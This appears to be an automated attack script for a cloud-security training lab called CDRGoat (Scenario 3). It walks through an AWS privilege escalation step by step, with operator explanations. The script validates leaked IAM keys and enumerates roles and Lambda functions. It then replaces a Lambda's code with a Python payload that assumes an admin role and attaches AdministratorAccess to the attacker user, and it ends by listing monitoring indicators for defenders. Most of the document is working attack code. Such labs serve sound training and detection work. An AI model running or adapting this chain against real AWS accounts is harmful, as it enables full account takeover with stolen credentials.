#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 3               ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Configuring aws credentials\n"
  printf "  • Step 2. Permission enumeration for leaked credentials\n"
  printf "  • Step 3. Enumerating custom roles\n"
  printf "  • Step 4. Enumerating Lambda functions\n"
  printf "  • Step 5. Reviewing all collected information\n"
  printf "  • Step 6. Executing privilege escalation via Lambda\n"
  printf "  • Step 7. Cleanup\n"
  
}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in aws curl jq zip; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
#############################################
# Step 1. Configuring aws credentials
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring aws credentials to use awscli  ===" "${RESET}"
is_valid_keys() {
  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
  local rc=0 out

  # 1) Ensure no env creds override our profile
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
  PROFILE="streamgoat-scenario-3"

  # 2) Write creds to a dedicated profile (avoid clobbering 'default')
  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
  aws configure set region                "$region" --profile "$PROFILE"

  # 3) Force the call to use our profile
  spin_start "Validating credentials via STS"
  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
  spin_stop

  if [ "$rc" -ne 0 ]; then
    return 1
  fi

  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"

  return 0
}

step "Starting point configuration"
while :; do
  read -r -p "Enter leaked AWS key: " AWSKEY_USER
  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
    break
  else
    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
  fi
done

printf "\n"
read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
printf "Credentials may leak from various sources:\n"
printf "  • Hardcoded in source code repositories\n"
printf "  • Exposed in CI/CD logs or container images\n"
printf "  • Leaked via misconfigured S3 buckets\n\n"
printf "STS GetCallerIdentity confirms the credentials are valid.\n\n"

#############################################
# Step 2. Permission enumeration for leaked credentials
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"

# init colors (portable)

try() {
  local desc="$1"; shift
  local rc
  set +e
  "$@" >/dev/null 2>&1
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
  else
    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  fi
}


# Identity/context
try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
aws sts get-caller-identity --profile "$PROFILE"
try "IAM List Roles"  aws iam list-roles --profile "$PROFILE"

# Inventory
try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
try "SSM DescribeInstances" aws ssm describe-instance-information --profile "$PROFILE"
try "KMS ListKeys"          aws kms list-keys --limit 5 --profile "$PROFILE"
try "ECR DescribeRepos"     aws ecr describe-repositories --max-results 5 --profile "$PROFILE"
try "Lambda ListFunctions"  aws lambda list-functions --max-items 5 --profile "$PROFILE"
try "DDB ListTables"        aws dynamodb list-tables --max-items 5 --profile "$PROFILE"
try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --profile "$PROFILE"
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"

step "Checking managed policies attached to user: StreamGoat-user"

IAM_USER_NAME="StreamGoat-user"

user_managed_policies=$(aws iam list-attached-user-policies --user-name "$IAM_USER_NAME" --profile "$PROFILE" \
  --output json | jq -r '.AttachedPolicies[].PolicyArn')

if [ -z "$user_managed_policies" ]; then
  info "No managed policies attached to user: $IAM_USER_NAME"
else
  for policy_arn in $user_managed_policies; do
    policy_name=$(basename "$policy_arn")
    printf "${BOLD}${YELLOW}Managed Policy: %s${RESET}\n" "$policy_name"

    # Get the default version of the policy
    version_id=$(aws iam get-policy --policy-arn "$policy_arn" --profile "$PROFILE" \
      --output json | jq -r '.Policy.DefaultVersionId')

    # Get the actual policy document
    doc=$(aws iam get-policy-version --profile "$PROFILE" \
      --policy-arn "$policy_arn" \
      --version-id "$version_id" \
      --output json | jq -r '.PolicyVersion.Document')

    # Print each statement in a clean format
    echo "$doc" | jq -c '.Statement[]' | while read -r stmt; do
      sid=$(echo "$stmt" | jq -r '.Sid // "None"')
      effect=$(echo "$stmt" | jq -r '.Effect')
      action=$(echo "$stmt" | jq -c '.Action')
      resource=$(echo "$stmt" | jq -c '.Resource')
      printf "    Sid:      %s\n    Effect:   %s\n    Action:   %s\n    Resource: %s\n\n" "$sid" "$effect" "$action" "$resource"
    done
  done
fi

printf "\n"
read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We enumerated permissions for the leaked credentials.\n\n"
printf "Key findings:\n"
printf "  • ${MAGENTA}iam:ListRoles${RESET}: Can enumerate IAM roles\n"
printf "  • ${MAGENTA}lambda:*${RESET}: Full Lambda access (except CreateFunction)\n\n"
printf "Even without CreateFunction, we can modify existing Lambda code\n"
printf "using ${CYAN}UpdateFunctionCode${RESET} and invoke functions.\n\n"

#############################################
# End of Step 2
#############################################
# Step 3. Enumerating custom roles
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Enumerating StreamGoat-Role* roles  ===" "${RESET}"
printf "We noticed that one of successful enumeration result was for ${YELLOW}IAM List Roles${RESET}. Let's dig inside.\n"

step "Enumerating IAM roles starting with 'StreamGoat-Role'"

# List roles whose name starts with StreamGoat
roles=$(aws iam list-roles --profile "$PROFILE" --output json | jq -r '.Roles[] | select(.RoleName | startswith("StreamGoat-Role")) | .RoleName')

if [ -z "$roles" ]; then
  err "No roles starting with 'StreamGoat' found"
else
  ok "Found roles:"
  echo "$roles"
fi

# Enumerate each managed role's attached and inline policies
for role in $roles; do
  echo
  printf "${BOLD}${MAGENTA}Role: %s${RESET}\n" "$role"

  attached_policies=$(aws iam list-attached-role-policies --profile "$PROFILE" --role-name "$role" --output json | jq -r '.AttachedPolicies[].PolicyArn')

  for policy_arn in $attached_policies; do
    policy_name=$(basename "$policy_arn")
    printf "  ${YELLOW}Managed Policy: %s${RESET}\n" "$policy_name"

    # Get default version
    version_id=$(aws iam get-policy --profile "$PROFILE" --policy-arn "$policy_arn" --output json | jq -r '.Policy.DefaultVersionId')
    doc=$(aws iam get-policy-version --profile "$PROFILE" --policy-arn "$policy_arn" --version-id "$version_id" --output json | jq -r '.PolicyVersion.Document')

    # Pretty print policy doc
    echo "$doc" | jq -c '.Statement[]' | while read -r stmt; do
      sid=$(echo "$stmt" | jq -r '.Sid // "None"')
      effect=$(echo "$stmt" | jq -r '.Effect')
      action=$(echo "$stmt" | jq -c '.Action')
      resource=$(echo "$stmt" | jq -c '.Resource')
      printf "    Sid:      %s\n    Effect:   %s\n    Action:   %s\n    Resource: %s\n" "$sid" "$effect" "$action" "$resource"
    done
  done
done

printf "\n"
read -r -p "The custom role ${YELLOW}StreamGoat-Role-admin${RESET} looks interesting, so let's take its ARN for potential use in the future. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
step "Looking for StreamGoat-Role-admin..."

STREAMGOAT_ROLE_NAME="StreamGoat-Role-admin"

# Get the full role metadata (ARN, etc.)
STREAMGOAT_ROLE_ARN=$(aws iam get-role --profile "$PROFILE" --role-name "$STREAMGOAT_ROLE_NAME" \
  --output json | jq -r '.Role.Arn')

if [ -n "$STREAMGOAT_ROLE_ARN" ]; then
  ok "Captured ARN:  $STREAMGOAT_ROLE_ARN"
else
  err "Could not retrieve ARN for $STREAMGOAT_ROLE_NAME"
  exit 1
fi
printf "\n"
read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We enumerated IAM roles and discovered:\n\n"
printf "  • ${MAGENTA}StreamGoat-Role-admin${RESET}: Has AdministratorAccess attached!\n\n"
printf "If we can assume this role or use it via Lambda, we achieve\n"
printf "full account compromise.\n\n"

#############################################
# End of Step 3
#############################################
# Step 4. Enumerating Lambda functions
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Enumerating StreamGoat Lambda functions  ===" "${RESET}"

# Get all Lambda functions starting with StreamGoat
step "Fetching Lambda functions with names starting with 'StreamGoat'"
lambda_functions=$(aws lambda list-functions --profile "$PROFILE" --output json | jq -r '.Functions[] | select(.FunctionName | startswith("StreamGoat")) | @base64')

if [ -z "$lambda_functions" ]; then
  err "No Lambda functions with prefix 'StreamGoat' found"
  exit 0
fi

# Iterate over each Lambda
for encoded in $lambda_functions; do
  _jq() { echo "$encoded" | base64 --decode | jq -r "$1"; }

  LAMBDA_NAME=$(_jq '.FunctionName')
  ROLE_ARN=$(_jq '.Role')
  ROLE_NAME=$(basename "$ROLE_ARN")

  printf "${BOLD}${MAGENTA}Lambda Function: %s${RESET}\n" "$LAMBDA_NAME"
  printf "  Execution Role: %s\n" "$ROLE_NAME"
  printf "  Role ARN:       %s\n" "$ROLE_ARN"

  #############################
  # Managed Policies
  #############################
  attached_policies=$(aws iam list-attached-role-policies --profile "$PROFILE" --role-name "$ROLE_NAME" --output json | jq -r '.AttachedPolicies[].PolicyArn')

  for policy_arn in $attached_policies; do
    policy_name=$(basename "$policy_arn")
    printf "  ${YELLOW}Managed Policy: %s${RESET}\n" "$policy_name"

    version_id=$(aws iam get-policy --profile "$PROFILE" --policy-arn "$policy_arn" --output json | jq -r '.Policy.DefaultVersionId')
    doc=$(aws iam get-policy-version --profile "$PROFILE" --policy-arn "$policy_arn" --version-id "$version_id" --output json | jq -r '.PolicyVersion.Document')

    echo "$doc" | jq -c '.Statement[]' | while read -r stmt; do
      sid=$(echo "$stmt" | jq -r '.Sid // "None"')
      effect=$(echo "$stmt" | jq -r '.Effect')
      action=$(echo "$stmt" | jq -c '.Action')
      resource=$(echo "$stmt" | jq -c '.Resource')
      printf "    Sid:      %s\n    Effect:   %s\n    Action:   %s\n    Resource: %s\n\n" "$sid" "$effect" "$action" "$resource"
    done
  done
done

read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We discovered StreamGoat-Lambda_2 with ${MAGENTA}sts:AssumeRole${RESET} permission.\n\n"
printf "This allows the Lambda to assume other roles, including\n"
printf "StreamGoat-Role-admin. If we modify the Lambda code, we can:\n"
printf "  • Assume the admin role\n"
printf "  • Grant our user permanent admin access\n\n"

#############################################
# End of Step 4
#############################################
# Step 5. Reviewing all collected information
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Reviewing all collected information  ===" "${RESET}"
printf "\n"
printf "In step 2, we saw that our user has ${YELLOW}lambda:*${RESET} permissions, but with a specific deny for ${YELLOW}lambda:CreateFunction${RESET}.\n"
printf "In step 4, we identified the Lambda function ${MAGENTA}StreamGoat-Lambda_2${RESET} which has a policy allowing ${YELLOW}sts:AssumeRole${RESET}.\n"
printf "And finally, we saw ${CYAN}StreamGoat-Role-admin${RESET} role with full administrator privileges.\n"
printf "Based on this information, our planned attack vector will be through modification of ${MAGENTA}StreamGoat-Lambda_2${RESET}:\n 1. AssumeRole ${CYAN}StreamGoat-Role-admin${RESET}\n 2. Assign Role ${CYAN}StreamGoat-Role-admin${RESET} to owned user ${YELLOW}StreamGoat-user${RESET}\n\n"

read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We synthesized our findings into an attack plan:\n\n"
printf "  1. Our user has ${MAGENTA}lambda:UpdateFunctionCode${RESET}\n"
printf "  2. Lambda_2 has ${MAGENTA}sts:AssumeRole${RESET}\n"
printf "  3. StreamGoat-Role-admin has ${MAGENTA}AdministratorAccess${RESET}\n\n"
printf "Attack: Modify Lambda to AssumeRole admin and grant us admin access.\n\n"

#############################################
# End of Step 5
#############################################
# Step 6. Executing privilege escalation via Lambda
#############################################

printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Executing privilege escalation via Lambda  ===" "${RESET}"
step "Preparing malicious Lambda payload..."

# Variables
TARGET_LAMBDA="StreamGoat-Lambda_2"
ESCALATION_ROLE_ARN="$STREAMGOAT_ROLE_ARN"
ATTACKER_USER="StreamGoat-user"

# Removing artefacts from previous attempts
rm -rf /tmp/lambda-escalation
# Create temp directory for packaging
mkdir -p /tmp/lambda-escalation && cd /tmp/lambda-escalation

cat > index.py <<EOF
import boto3
def handler(event, context):
    sts = boto3.client("sts")
    resp = sts.assume_role(
        RoleArn="${ESCALATION_ROLE_ARN}",
        RoleSessionName="exploit-escalation"
    )

    creds = resp["Credentials"]
    iam = boto3.client(
        "iam",
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"]
    )

    # Attempt to attach admin policy to attacker user
    iam.attach_user_policy(
        UserName="${ATTACKER_USER}",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )

    return "Exploit attempted"
EOF

# Create deployment package
zip function.zip index.py >/dev/null



# Update Lambda code
spin_start "Pushing update for Lambda function, it may take some time..."
aws lambda update-function-code \
  --function-name "$TARGET_LAMBDA" --profile "$PROFILE" \
  --zip-file fileb://function.zip \
  --publish >/dev/null
sleep 60
spin_stop

ok "Lambda code updated"

# Invoke Lambda to trigger escalation
step "Triggering Lambda for privilege escalation"

aws lambda invoke --profile "$PROFILE" --function-name "$TARGET_LAMBDA" /tmp/lambda_output.json >/dev/null


ok "Lambda invoked. Output:"
cat /tmp/lambda_output.json
cd - > /dev/null

# Validate if user now has Admin policy
step "Verifying if admin privileges were assigned to user"

admin_attached=$(aws iam list-attached-user-policies --profile "$PROFILE" --user-name "$ATTACKER_USER" \
  --output json | jq -r '.AttachedPolicies[] | select(.PolicyName=="AdministratorAccess") | .PolicyName')

if [ "$admin_attached" == "AdministratorAccess" ]; then
  ok "User $ATTACKER_USER is now Admin!"
  printf "\nLet's repeat a few of the permission enumeration attempts we performed in step 2\n"
  sleep 10
  try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
  try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
  try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
else
  err "Privilege escalation failed or not applied yet."
fi
printf "\n"
read -r -p "Step 6 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We executed the privilege escalation attack:\n\n"
printf "  1. Updated Lambda code via ${MAGENTA}UpdateFunctionCode${RESET}\n"
printf "  2. Lambda assumed admin role and attached AdministratorAccess to our user\n"
printf "  3. Verified with permission re-enumeration - all [OK]!\n\n"
printf "StreamGoat-user now has full admin privileges.\n\n"


#############################################
# End of Step 6
#############################################
# Step 7. Cleanup — Detach elevated policy from StreamGoat-user
#############################################

printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. Cleanup: Detaching AdministratorAccess from the user  ===" "${RESET}"

ATTACKER_USER="StreamGoat-user"
POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"

rm -rf /tmp/lambda-escalation
rm /tmp/lambda_output.json

# Detach the policy
aws iam detach-user-policy \
  --user-name "$ATTACKER_USER" --profile "$PROFILE" \
  --policy-arn "$POLICY_ARN" && ok "Detached AdministratorAccess from $ATTACKER_USER"

# Verify it's gone
attached=$(aws iam list-attached-user-policies \
  --user-name "$ATTACKER_USER" --profile "$PROFILE" \
  --output json | jq -r '.AttachedPolicies[]?.PolicyArn')

if echo "$attached" | grep -q "$POLICY_ARN"; then
  err "Policy still attached — cleanup failed"
else
  ok "Cleanup verified — no elevated policy remains"
fi
################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Validated leaked IAM user credentials\n"
printf "  2. Enumerated permissions (lambda:*, iam:ListRoles)\n"
printf "  3. Discovered StreamGoat-Role-admin with AdministratorAccess\n"
printf "  4. Found Lambda_2 with sts:AssumeRole permission\n"
printf "  5. Modified Lambda code via UpdateFunctionCode\n"
printf "  6. Lambda assumed admin role and attached AdministratorAccess to user\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Full AWS account administrator access\n"
printf "  • Lambda code injection for privilege escalation\n"
printf "  • Role chaining via sts:AssumeRole\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • Lambda code updates (UpdateFunctionCode events)\n"
printf "  • AssumeRole calls to privileged roles\n"
printf "  • AttachUserPolicy/AttachRolePolicy to admin policies\n"
printf "  • Credential usage from unexpected locations\n\n"

printf "\n"
read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit" _ || true
